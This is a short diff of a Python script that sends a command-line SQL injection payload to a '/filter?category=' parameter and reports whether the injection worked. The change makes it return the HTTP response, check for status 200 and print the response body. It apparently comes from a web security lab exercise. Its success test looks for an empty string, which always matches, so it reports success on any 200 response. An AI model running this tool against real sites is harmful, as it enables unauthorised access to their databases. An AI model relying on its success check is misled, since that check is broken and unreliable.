@@ -10,10 +10,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def exploit_sqli(url, payload):
     uri = '/filter?category='
     r = requests.get(url + uri + payload, verify=False)
-    if "" in r.text:
-        return True
-    else:
-        return False
+    return r
 
 
 if __name__ == "__main__":
@@ -25,7 +22,11 @@ if __name__ == "__main__":
         print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
         sys.exit(-1)
 
-    if exploit_sqli(url, payload):
+    response = exploit_sqli(url, payload)
+
+    if response.status_code == 200 and "" in response.text:
         print("[+] SQL injection successful!")
+        print("Response:")
+        print(response.text)
     else:
         print("[-] SQL injection unsuccessful!")
